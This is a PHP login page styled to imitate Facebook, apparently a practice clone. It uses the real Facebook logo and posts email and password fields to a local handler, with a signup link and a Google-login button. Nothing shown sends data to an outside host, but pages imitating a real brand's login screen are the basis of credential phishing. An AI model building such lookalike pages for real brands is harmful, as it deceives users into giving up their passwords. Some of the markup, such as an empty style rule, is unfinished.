<?php
require 'config.php';
$flash = flash();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Facebook Style Login</title>
<link rel="stylesheet" href="fb_login.css">
<style>
  .ok{
    background-color: 
  }
</style>
</head>
<body>

<div class="fb-container">

    <div class="left-section">
      

    </div>

    <div class="right-section">
        <div class="login-box">

            <?php if($flash): ?>
                <div class="error-box"><?= htmlspecialchars($flash) ?></div>
            <?php endif; ?>

            <form action="login_process.php" method="POST">
             <div class="ok"> 
          <center>
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" 
         class="fb-logo" alt="Facebook Logo" style="border-radius: 40px;width: 30%;height: 70%;">
       </center>
     </div>
    <h2>Facebook Login</h2>

                <input type="text" name="identifier" placeholder="Email address or phone number" required>
                <input type="password" name="password" placeholder="Password" required>

                <button type="submit" class="login-btn">Log In</button>
                <button type="submit" class="login-btn"><img src="okok.png" alt="g" style="height:26px;margin-left: 0%;"><a href="dashboard1.php" style="text-decoration: none;color: white;border-radius: 10px;">Log with google</a></button>
            </form>

            <a href="#" class="forgot">Forgotten password?</a>
            <div class="line"></div>

            <a href="signup.php">
                <button class="create-btn">Create new account</button>
            </a>
        </div>
    </div>

</div>

</body>
</html>



